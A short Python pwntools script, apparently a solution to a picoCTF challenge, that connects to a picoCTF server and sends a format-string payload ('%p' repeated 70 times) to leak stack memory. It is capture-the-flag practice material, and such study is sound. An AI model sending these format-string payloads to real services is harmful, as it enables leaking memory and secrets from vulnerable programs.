from pwn import *

# io = process("./vuln")
io = remote("saturn.picoctf.net", 57806)
io.readuntil(b"Tell me a story and then I'll tell you one >>")
io.sendline(b"%p" * 70)
# io.sendline(b"%40p,%41p,%42p,%43p,%44p,%45p,%46p,%47p,%48p,%49p,%50p")
io.recvline()
stack = io.recvall()

print(stack.split(b","))
